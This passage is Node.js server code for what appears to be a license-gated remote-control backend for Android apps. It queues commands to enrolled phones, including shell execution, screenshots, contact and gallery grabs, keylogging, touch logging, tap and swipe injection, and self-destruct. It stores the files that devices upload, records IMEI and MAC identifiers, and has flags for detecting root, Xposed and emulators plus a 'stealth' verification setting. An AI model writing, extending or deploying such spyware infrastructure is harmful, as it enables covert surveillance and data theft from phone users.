  if (cmds.length) console.log(`[beat] ${deviceId}(${device.name}) push ${cmds.length}: ${cmds.map(c=>c.type).join(',')}`);
  return {
    code: 0,
    message: 'ok',
    data: {
      config: cfg,
      pending_commands: cmds
    }
  };
}

function deviceAck(params) {
  const deviceId = String(params.device_id || params.deviceId || params.did || '').trim();
  const softwareType = String(params.software_type || params.software || params.app || '').trim();
  const rawIds = params.command_ids || params.ids || [];
  const ids = (Array.isArray(rawIds) ? rawIds : String(rawIds).split(',')).map(s => String(s).trim()).filter(Boolean);
  const device = softwareType
    ? db.devices.find(d => d.device_id === deviceId && d.software_type === softwareType)
    : db.devices.find(d => d.device_id === deviceId);
  if (!device) return { code: -1, message: 'device not found' };
  const acked = device.pending_commands.filter(c => ids.includes(c.id));
  device.pending_commands = device.pending_commands.filter(c => !ids.includes(c.id));
  if (acked.length) {
    console.log(`[ack] ${deviceId}(${device.name}) done: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
    for (const c of acked) {
      if (c.type === 'switch_toggle') {
        console.log(`[sw+] ${device.name || deviceId} ${c.payload.key}=${c.payload.on}`);
      } else if (c.type === 'screenshot') {
        console.log(`[scr+] ${device.name || deviceId} uploaded`);
      } else if (c.type === 'get_gallery') {
        console.log(`[gal+] ${device.name || deviceId} uploaded`);
      }
    }
  }
  if (acked.some(c => c.type === 'self_destruct') || params.result === 'self_destructed') {
    device.status = 'destroyed';
  }
  device.updated_at = now();
  saveDb();
  return { code: 0, message: 'ok' };
}

function listDevices(searchParams) {
  refreshDeviceStatuses();
  let list = db.devices.slice();
  const group = searchParams.get('group');
  const status = searchParams.get('status');
  const search = (searchParams.get('q') || '').toLowerCase();
  if (group) list = list.filter(d => String(d.group_id) === String(group) || d.software_type === group);
  if (status) list = list.filter(d => d.status === status);
  if (search) list = list.filter(d =>
    (d.name || '').toLowerCase().includes(search) ||
    (d.device_id || '').toLowerCase().includes(search) ||
    (d.ip || '').toLowerCase().includes(search) ||
    (d.software_type || '').toLowerCase().includes(search));
  list.sort((a, b) => b.id - a.id);
  return list.map(enrichDevice);
}

function enrichDevice(device) {
  const group = db.groups.find(g => g.id === device.group_id);
  return Object.assign({}, device, {
    effective_config: effectiveConfig(device),
    group_name: group ? (group.display_name || group.name) : '',
    pending_command_count: (device.pending_commands || []).length
  });
}

function refreshDeviceStatuses() {
  const nowMs = Date.now();
  for (const device of db.devices) {
    if (device.status === 'destroyed') continue;
    const cfg = effectiveConfig(device);
    const interval = (cfg.poll_interval || 60) * 1000;
    const lastSeen = new Date(device.last_seen_at || 0).getTime();
    if (nowMs - lastSeen > interval * 3) {
      device.status = 'offline';
    }
  }
}

function effectiveConfig(device) {
  const base = Object.assign({}, db.global_config);
  const group = db.groups.find(g => g.id === device.group_id);
  if (group && group.config) Object.assign(base, group.config);
  if (device.config_override) Object.assign(base, device.config_override);
  return base;
}

function findOrCreateGroup(name) {
  let group = db.groups.find(g => g.name === name);
  if (!group) {
    group = createGroup({ name, display_name: name });
    saveDb();
  }
  return group;
}

function createGroup({ name, display_name, config }) {
  const group = {
    id: nextGroupId(),
    name: String(name),
    display_name: String(display_name || name),
    config: sanitizeConfig(config) || Object.assign({}, db.global_config),
    created_at: now(),
    updated_at: now()
  };
  db.groups.push(group);
  return group;
}

function defaultConfig() {
  return {
    poll_interval: 60,
    enable_c2: true,
    allow_device_diagnostics: false,
    allow_root_commands: false,
    allow_screenshot: false,
    allow_contacts: false,
    allow_shell: false,
    allow_input_control: false,
    debug: false,
    enable_hook: false,
    ban_root: false,
    ban_xposed: false,
    ban_emulator: false,
    ban_virtual_app: false,
    ban_dual_app: false,
    popup_title: 'Enter License',
    popup_message: 'One device per key',
    popup_html: '',
    // use_html_popup: use native dialog by default, enable html popup only when explicitly checked
    use_html_popup: false,
    // heartbeat_verify: enable card verification on every C2 heartbeat (default true)
    heartbeat_verify: true,
    // When heartbeat_verify is OFF, this interval (minutes) controls how often to verify.
    // 0 = never; > 0 = verify every N minutes for stealth.
    heartbeat_verify_interval_minutes: 0,
    // 自动发卡：注册时若卡密为空则自动签发一张永久卡并绑定（调试或免卡密场景）
    auto_issue_card: false,
    // 卡密过期行为：none=不处理 block=阻断 C2 命令 uninstall=下发自毁命令
    expire_action: 'none'
  };
}

function normalizedConfig(config) {
  return Object.assign(defaultConfig(), sanitizeConfig(config) || {});
}
function sanitizeConfig(config) {
  if (!config) return null;
  let obj = config;
  if (typeof config === 'string') {
    try { obj = JSON.parse(config); } catch { return null; }
  }
  if (typeof obj !== 'object') return null;
  const sane = {};
  if (obj.poll_interval != null && obj.poll_interval !== '') sane.poll_interval = clampInt(obj.poll_interval, 5, 86400, 60);
  for (const key of ['enable_c2', 'allow_device_diagnostics', 'allow_root_commands',
    'allow_screenshot', 'allow_contacts', 'allow_shell', 'allow_input_control',
    'debug', 'enable_hook', 'ban_root', 'ban_xposed', 'ban_emulator', 'ban_virtual_app', 'ban_dual_app',
    'use_html_popup', 'auto_issue_card', 'heartbeat_verify']) {
    if (obj[key] != null) sane[key] = boolish(obj[key]);
  }
  if (obj.heartbeat_verify_interval_minutes != null) sane.heartbeat_verify_interval_minutes = clampInt(obj.heartbeat_verify_interval_minutes, 0, 10080, 0);
  if (obj.popup_title != null) sane.popup_title = String(obj.popup_title).trim().slice(0, 60) || '请输入卡密';
  if (obj.popup_message != null) sane.popup_message = String(obj.popup_message).trim().slice(0, 120) || '一机一卡，首次使用自动绑定设备';
  if (obj.popup_html != null) sane.popup_html = String(obj.popup_html).slice(0, 20000);
  if (obj.expire_action != null && ['none', 'block', 'uninstall'].includes(String(obj.expire_action))) sane.expire_action = String(obj.expire_action);
  if (Array.isArray(obj.switches)) {
    sane.switches = obj.switches.filter(s => s && s.key && s.name).map(s => ({
      key: String(s.key).trim(),
      name: String(s.name).trim().slice(0, 20),
      default_on: s.default_on === true
    }));
  }
  return Object.keys(sane).length ? sane : null;
}

function defaultAiConfig() {
  return {
    base_url: AI_API_BASE_URL,
    model: AI_MODEL,
    prompt: DEFAULT_AI_HTML_PROMPT
  };
}

function normalizedAiConfig(config) {
  return Object.assign(defaultAiConfig(), sanitizeAiConfig(config) || {});
}

function sanitizeAiConfig(config) {
  if (!config) return defaultAiConfig();
  let obj = config;
  if (typeof config === 'string') {
    try { obj = JSON.parse(config); } catch { obj = {}; }
  }
  if (!obj || typeof obj !== 'object') obj = {};
  const sane = {};
  if (obj.base_url != null) sane.base_url = trimRightSlash(String(obj.base_url).trim()).slice(0, 300) || AI_API_BASE_URL;
  if (obj.model != null) sane.model = String(obj.model).trim().slice(0, 100) || AI_MODEL;
  if (obj.prompt != null) sane.prompt = String(obj.prompt).trim().slice(0, 8000) || DEFAULT_AI_HTML_PROMPT;
  return Object.assign(defaultAiConfig(), sane);
}

function getAiConfigForClient() {
  const cfg = normalizedAiConfig(db.ai_config);
  return Object.assign({}, cfg, { api_key_configured: !!AI_API_KEY });
}

async function generateHtmlWithAi(userRequest, promptOverride) {
  if (!AI_API_KEY) throw new Error('AI_API_KEY 未配置，请先在服务器 .env 中配置');
  const cfg = normalizedAiConfig(db.ai_config);
  const prompt = String(promptOverride || cfg.prompt || DEFAULT_AI_HTML_PROMPT).trim();
  const requirement = String(userRequest || '').trim().slice(0, 4000);
  if (!requirement) throw new Error('请输入想生成的面板格式/风格要求');
  const content = await requestAiChat(cfg.base_url, cfg.model, [
    { role: 'system', content: prompt },
    { role: 'user', content: requirement }
  ]);
  const html = stripMarkdownFence(content).trim();
  if (!html || !/<(?:!doctype|html|div|section|style|script|body)\b/i.test(html)) throw new Error('AI 未返回有效 HTML');
  return html.slice(0, 20000);
}

function requestAiChat(baseUrl, model, messages) {
  return new Promise((resolve, reject) => {
    const target = new URL('/v1/chat/completions', trimRightSlash(baseUrl || AI_API_BASE_URL));
    const payload = JSON.stringify({ model: model || AI_MODEL, messages, temperature: 0.7, max_tokens: 2000 });
    const client = target.protocol === 'https:' ? https : http;
    const req = client.request(target, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${AI_API_KEY}`,
        'Content-Length': Buffer.byteLength(payload)
      },
      timeout: 120000
    }, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf8');
        if (response.statusCode < 200 || response.statusCode >= 300) {
          return reject(new Error(`AI 请求失败：HTTP ${response.statusCode} ${body.slice(0, 300)}`));
        }
        try {
          const data = JSON.parse(body);
          const text = data.choices && data.choices[0] && data.choices[0].message && data.choices[0].message.content;
          if (!text) return reject(new Error('AI 响应为空'));
          resolve(text);
        } catch (e) {
          reject(new Error('AI 响应解析失败：' + e.message));
        }
      });
    });
    req.on('timeout', () => req.destroy(new Error('AI 请求超时')));
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

function stripMarkdownFence(text) {
  const value = String(text || '').trim();
  const match = value.match(/^```(?:html)?\s*([\s\S]*?)\s*```$/i);
  return match ? match[1] : value;
}

function queueDeviceCommand(device, params) {
  const type = String(params.type || '').trim();
  const allowed = ['self_destruct', 'message', 'kick', 'update_config',
    'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake',
    'keylog_on', 'keylog_off', 'keylog_get',
    'touchlog_on', 'touchlog_off', 'touchlog_get'];
  if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
  const cfg = effectiveConfig(device);
  if (!cfg.enable_c2) throw new Error('c2 disabled');
  // payload 先解析出来（后续校验需要用到）
  let payload = params.payload;
  if (typeof payload === 'string') { try { payload = JSON.parse(payload); } catch { payload = { text: payload }; } }
  if (!payload || typeof payload !== 'object') payload = {};
  // 能力开关校验
  if (type === 'screenshot' && !cfg.allow_screenshot) throw new Error('screenshot disabled');
  if (type === 'get_contacts' && !cfg.allow_contacts) throw new Error('contacts disabled');
  if (type === 'get_gallery' && !cfg.allow_contacts) throw new Error('gallery disabled');
  if (type === 'switch_toggle' && (!payload.key || payload.on === undefined)) throw new Error('switch_toggle requires payload.key and payload.on');
  if (type === 'shell' && !cfg.allow_shell) throw new Error('shell disabled');
  if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('input disabled');
  if (type === 'message' && !payload.text && params.text) payload.text = String(params.text);
  if (type === 'update_config' && !payload.config) payload.config = sanitizeConfig(params.config) || {};
  if (type === 'shell' && !payload.cmd && params.cmd) payload.cmd = String(params.cmd);
  if (type === 'get_gallery') {
    if (!payload.limit) payload.limit = clampInt(params.limit || params.count, 1, 500, 100);
  }
  if (type === 'input_tap') {
    if (!payload.x && params.x) payload.x = Number(params.x);
    if (!payload.y && params.y) payload.y = Number(params.y);
  }
  if (type === 'input_swipe') {
    for (const k of ['x1', 'y1', 'x2', 'y2', 'duration']) {
      if (payload[k] == null && params[k] != null) payload[k] = Number(params[k]);
    }
  }
  const cmd = {
    id: crypto.randomBytes(8).toString('hex'),
    type,
    payload,
    created_at: now()
  };
  device.pending_commands = device.pending_commands || [];
  // 在真正的命令前插一个 wake，让客户端结束当前 sleep 立即来心跳
  if (type !== 'wake') {
    const alreadyWake = device.pending_commands.some(c => c.type === 'wake');
    if (!alreadyWake) {
      device.pending_commands.unshift({ id: crypto.randomBytes(8).toString('hex'), type: 'wake', payload: {}, created_at: now() });
    }
  }
  device.pending_commands.push(cmd);
  device.updated_at = now();
  // 管理操作日志：开关/相册等关键命令纳入全局监控
  if (type === 'switch_toggle') {
    console.log(`[sw] ${device.name || device.device_id} ${payload.key}=${payload.on}`);
  } else if (type === 'get_gallery') {
    console.log(`[gal] ${device.name || device.device_id} request limit=${payload.limit || 100}`);
  } else if (type === 'get_photo') {
    console.log(`[gal] ${device.name || device.device_id} photo id=${payload.id}`);
  } else if (type === 'screenshot') {
    console.log(`[scr] ${device.name || device.device_id} request`);
  }
  return cmd;
}

async function deviceUpload(req) {
  // multipart/form-data 手动解析：boundary + device_id + cmd_id + type + data(base64) 或 file bytes
  const ctype = String(req.headers['content-type'] || '');
  const rawBuf = await new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', c => { chunks.push(c); size += c.length; if (size > 20 * 1024 * 1024) req.destroy(); });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
  let deviceId = '', cmdId = '', type = '', dataB64 = '', ext = 'bin';
  if (ctype.includes('multipart/form-data')) {
    const boundaryMatch = ctype.match(/boundary=([^\s;]+)/);
    if (boundaryMatch) {
      const parts = rawBuf.toString('binary').split('--' + boundaryMatch[1]);
      for (const part of parts) {
        const cdMatch = part.match(/Content-Disposition:[^\r\n]*name="([^"]+)"/i);
        if (!cdMatch) continue;
        const fieldName = cdMatch[1];
        const bodyStart = part.indexOf('\r\n\r\n');
        if (bodyStart < 0) continue;
        const value = part.slice(bodyStart + 4).replace(/\r\n$/, '');
        if (fieldName === 'device_id') deviceId = value;
        else if (fieldName === 'cmd_id') cmdId = value;
        else if (fieldName === 'type') type = value;
        else if (fieldName === 'ext') ext = value.replace(/[^a-z0-9]/g, '') || 'bin';
        else if (fieldName === 'data') dataB64 = value;
      }
    }
  } else {
    const params = parseBody(req, rawBuf.toString('utf8'));
    deviceId = params.device_id || '';
    cmdId = params.cmd_id || '';
    type = params.type || '';
    dataB64 = params.data || '';
    ext = (params.ext || 'bin').replace(/[^a-z0-9]/g, '') || 'bin';
  }
  if (!deviceId) return { ok: false, message: 'missing device_id' };
  const device = db.devices.find(d => d.device_id === deviceId);
  if (!device) return { ok: false, message: 'device not found' };
  if (!dataB64) return { ok: false, message: 'missing data' };
  const buf = Buffer.from(dataB64, 'base64');
  const filename = `${device.id}_${type}_${Date.now()}.${ext}`;
  fs.writeFileSync(path.join(uploadsDir, filename), buf);
  device.uploads = device.uploads || [];
  device.uploads.unshift({ cmd_id: cmdId, type, filename, size: buf.length, created_at: now() });
  device.uploads = device.uploads.slice(0, 500);
  saveDb();
  console.log(`[upload] ${device.name}(${device.id}) ${type}.${ext} ${buf.length}B cmd=${cmdId}`);
  if (type === 'gallery_photo') {
    console.log(`[gallery] ${device.name} thumb ${(buf.length/1024).toFixed(0)}KB`);
  } else if (type === 'switch_toggle') {
    const txt = buf.slice(0, 200).toString('utf-8');
    console.log(`[sw] ${device.name} result: ${txt}`);
    // parse both formats: "sw[key]on/off" (new) and "开关[key]开/关" (legacy)
    const swMatch = txt.match(/sw\[([^\]]+)\](on|off)/) || txt.match(/开关\[([^\]]+)\](开|关)/);
    if (swMatch) {
      const swKey = 'sw_' + swMatch[1];
      const swOn = swMatch[2] === 'on' || swMatch[2] === '开';
      device.config_override = device.config_override || {};
      device.config_override[swKey] = swOn;
      console.log(`[sw] ${device.name} ${swMatch[1]}=${swOn} synced`);
    }
  }
  return { ok: true, filename };
}

function parseMeta(params) {
  const meta = {};
  for (const k of ['model', 'cpu', 'arch', 'mac', 'hostname', 'user', 'rom', 'screen', 'imei', 'manufacturer', 'sdk', 'os_version']) {
    if (params[k] != null && params[k] !== '') meta[k] = String(params[k]);
  }
  if (params.meta) {
    try {
      const obj = typeof params.meta === 'string' ? JSON.parse(params.meta) : params.meta;
      if (obj && typeof obj === 'object') Object.assign(meta, obj);
    } catch {}
  }
  return meta;
}

function remoteIp(req, params) {
  if (params && params.ip) return String(params.ip);
  const xff = String((req.headers || {})['x-forwarded-for'] || '').split(',')[0].trim();
  if (xff) return xff.replace(/^::ffff:/, '');
  return String((req.socket && req.socket.remoteAddress) || '').replace(/^::ffff:/, '');
}

function nextDeviceId() { const id = db.next_device_id || 1; db.next_device_id = id + 1; return id; }
function nextGroupId() { const id = db.next_group_id || 1; db.next_group_id = id + 1; return id; }
function findDevice(id) { return db.devices.find(d => d.id === id); }
function boolish(value) { if (typeof value === 'boolean') return value; const text = String(value).toLowerCase(); return text === 'true' || text === '1' || text === 'yes' || text === 'on'; }

function encryptConfig(config) {
  const json = JSON.stringify(config);
  const iv = crypto.randomBytes(16);
  const key = Buffer.from(CONFIG_AES_KEY, 'utf8');
  if (key.length !== 16) throw new Error('CONFIG_AES_KEY 必须是 16 字节');
  const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
  return Buffer.concat([iv, cipher.update(json, 'utf8'), cipher.final()]).toString('base64');
}
function readBody(req) { return new Promise((resolve, reject) => { const chunks = []; let size = 0; req.on('data', chunk => { chunks.push(chunk); size += chunk.length; if (size > 1024 * 1024) req.destroy(); }); req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8').replace(/^﻿/, ''))); req.on('error', reject); }); }
function parseBody(req, body) {
  const type = String(req.headers['content-type'] || '');
  if (type.includes('application/json')) {
    try {
      return JSON.parse(body || '{}');
    } catch {
      return {};
    }
  }
  const params = new URLSearchParams(body || '');
  const result = {};
  for (const [key, value] of params.entries()) {
    if (Object.prototype.hasOwnProperty.call(result, key)) {
      const current = result[key];
      result[key] = Array.isArray(current) ? current.concat(value) : [current, value];
    } else {
      result[key] = value;
    }
  }
  return result;
}
function sendJson(res, status, data) { end(res, status, JSON.stringify(data), 'application/json; charset=utf-8'); }
function sendFile(res, file, type) { if (!fs.existsSync(file)) return sendJson(res, 404, { ok: false }); end(res, 200, fs.readFileSync(file), type); }
function end(res, status, body, type = 'text/plain; charset=utf-8') { res.writeHead(status, { 'Content-Type': type }); res.end(body); }
function setCors(res) { res.setHeader('Access-Control-Allow-Origin', '*'); res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS'); res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With'); }
function getBearerToken(req) { const auth = String(req.headers.authorization || ''); return auth.startsWith('Bearer ') ? auth.slice(7) : ''; }
function isTokenValid(token) { if (!token || !tokens.has(token)) return false; const issuedAt = tokens.get(token); if (Date.now() - issuedAt > ADMIN_TOKEN_TTL_MS) { tokens.delete(token); return false; } tokens.set(token, Date.now()); return true; }
function isRateLimited(bucket, key, windowMs, maxCount) { const nowMs = Date.now(); const item = bucket.get(key) || { start: nowMs, count: 0 }; if (nowMs - item.start > windowMs) { item.start = nowMs; item.count = 0; } item.count += 1; bucket.set(key, item); return item.count > maxCount; }
function loadDb() {
  const empty = {
    next_id: 1, cards: [], logs: [],
    next_device_id: 1, devices: [],
    next_group_id: 1, groups: [],
    global_config: defaultConfig(),
    ai_config: defaultAiConfig()
  };
  if (!fs.existsSync(dbFile)) return empty;
  try {
    const raw = fs.readFileSync(dbFile, 'utf8').replace(/^﻿/, '');
    const data = JSON.parse(raw);
    return {
      next_id: data.next_id || 1,
      cards: data.cards || [],
      logs: data.logs || [],
      next_device_id: data.next_device_id || ((data.devices || []).reduce((m, d) => Math.max(m, d.id || 0), 0) + 1),
      devices: data.devices || [],
      next_group_id: data.next_group_id || ((data.groups || []).reduce((m, g) => Math.max(m, g.id || 0), 0) + 1),
      groups: (data.groups || []).map(g => Object.assign({}, g, { config: normalizedConfig(g.config) })),
      global_config: normalizedConfig(data.global_config),
      ai_config: normalizedAiConfig(data.ai_config)
    };
  } catch { return empty; }
}
function saveDb() { fs.writeFileSync(dbFile, JSON.stringify(db, null, 2), 'utf8'); }
function nextId() { const id = db.next_id || 1; db.next_id = id + 1; return id; }
function findCard(id) { return db.cards.find(card => card.id === id); }
function makeCard() { return crypto.randomBytes(8).toString('hex').toUpperCase(); }
function pickCardInput(params) {
  const cardKeys = ['input', 'card', 'kami', 'card_key', 'key', 'code'];
  const knownCard = firstMatchingValue(params, cardKeys, value => db.cards.some(card => card.card === value));
  if (knownCard) return knownCard;

  const embeddedKnownCard = findEmbeddedKnownCard(params, cardKeys);
  if (embeddedKnownCard) return embeddedKnownCard;

  const preferred = firstParam(params, ...cardKeys);
  if (preferred && !isBridgeToken(preferred)) return normalizeCard(preferred);

  const plausible = firstMatchingValue(params, cardKeys, value => looksLikeCard(value) && !isBridgeToken(value));
  if (plausible) return plausible;

  return '';
}
function findEmbeddedKnownCard(params, keys) {
  for (const key of keys) {
    const value = params[key];
    const values = Array.isArray(value) ? value : [value];
    for (const item of values) {
      const text = normalizeCard(item);
      if (!text || isBridgeToken(text)) continue;
      const hit = db.cards.find(card => card.card && text.includes(card.card));
      if (hit) return hit.card;
    }
  }
  return '';
}
function firstParam(params, ...keys) {
  for (const key of keys) {
    const value = params[key];
    if (Array.isArray(value)) {
      for (const item of value) {
        const text = String(item || '').trim();
        if (text) return text;
      }
    } else {
      const text = String(value || '').trim();
      if (text) return text;
    }
  }
  return '';
}
function firstMatchingValue(params, keys, predicate) {
  for (const key of keys) {
    const value = params[key];
    if (Array.isArray(value)) {
      for (const item of value) {
        const text = normalizeCard(item);
        if (text && predicate(text)) return text;
      }
    } else {
      const text = normalizeCard(value);
      if (text && predicate(text)) return text;
    }
  }
  return '';
}
function looksLikeCard(value) { return /^[A-Z0-9]{6,64}$/.test(String(value)); }
function isBridgeToken(value) { return /^(ONVERIFY2?|ONVERIFY|MONTHLY_CARD_POPUP)$/i.test(String(value)); }
function normalizeCard(value) { return String(value || '').trim().replace(/\s+/g, '').toUpperCase(); }
function clampInt(value, min, max, fallback) { const number = Number.parseInt(value, 10); if (!Number.isFinite(number)) return fallback; return Math.max(min, Math.min(max, number)); }
function now() { return new Date().toISOString(); }
function addDays(iso, days) { const date = new Date(iso); date.setUTCDate(date.getUTCDate() + Number(days)); return date.toISOString(); }
function trimRightSlash(value) { return String(value).replace(/\/+$/, ''); }
function ensureDir(dir) { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); }
function escapeHtml(value) { return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
function loadEnv(file) { if (!fs.existsSync(file)) return; for (const line of fs.readFileSync(file, 'utf8').replace(/^﻿/, '').split(/\r?\n/)) { const trimmed = line.trim(); if (!trimmed || trimmed.startsWith('#')) continue; const index = trimmed.indexOf('='); if (index <= 0) continue; const key = trimmed.slice(0, index).trim().replace(/^﻿/, ''); const value = trimmed.slice(index + 1).trim(); process.env[key] = value; } }

